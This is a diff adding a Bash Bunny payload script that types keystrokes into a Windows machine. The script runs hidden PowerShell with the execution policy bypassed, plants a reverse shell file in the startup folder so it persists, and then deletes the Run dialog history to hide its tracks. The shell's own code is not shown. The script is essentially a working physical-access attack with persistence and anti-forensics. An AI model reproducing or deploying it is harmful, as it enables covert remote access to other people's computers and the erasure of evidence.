@@ -1,0 +1,29 @@
+#Copy reverse shell file to shell:startup and start it
+
+
+#Setup
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+
+Q DELAY 5000
+
+#Atack fase
+LED ATTACK
+#Copy driveletter by running GetDrive.ps1
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\GetDrive.ps1')"
+Q 1000
+
+#Move servicehost.txt to shell:startup
+
+QUACK switch1/copy-reverse.txt
+
+#Cleaning up
+LED CLEANUP
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+QUACK ENTER
+
+LED FINISH
+#ATTACKMODE OFF
